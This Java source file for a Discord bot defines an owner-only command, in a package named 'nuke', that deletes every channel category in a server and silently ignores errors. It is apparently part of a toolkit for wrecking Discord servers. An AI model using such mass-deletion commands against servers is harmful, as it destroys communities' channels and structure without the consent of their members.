package me.comu.exeter.commands.nuke;

import me.comu.exeter.core.Core;
import me.comu.exeter.interfaces.ICommand;
import net.dv8tion.jda.api.entities.Category;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
import net.dv8tion.jda.api.exceptions.ErrorResponseException;
import net.dv8tion.jda.api.exceptions.HierarchyException;

import java.util.Arrays;
import java.util.List;

public class DeleteCategoriesCommand implements ICommand {
    @Override
    public void handle(List<String> args, GuildMessageReceivedEvent event) {
        if (!(event.getAuthor().getIdLong() == Core.OWNERID )) {
            return;
        }
        List<Category> categories = event.getGuild().getCategories();
        int tcSize = categories.size();

        try {
            for (int i = 0; i <= tcSize; i++) {
                try {
                    categories.get(i).delete().complete();
                } catch (HierarchyException | IndexOutOfBoundsException ex1) {

                }
            }
        } catch (HierarchyException | ErrorResponseException | IndexOutOfBoundsException ex) {

        }


    }

    @Override
    public String getHelp() {
        return "Deletes all categories\n`" + Core.PREFIX + getInvoke() + "`\nAliases: `" + Arrays.deepToString(getAlias()) + "`";
    }

    @Override
    public String getInvoke() {
        return "dcat";
    }

    @Override
    public String[] getAlias() {
        return new String[] {"delcat","delcategories","deletecategories","deletecat","delcat"};
    }
}
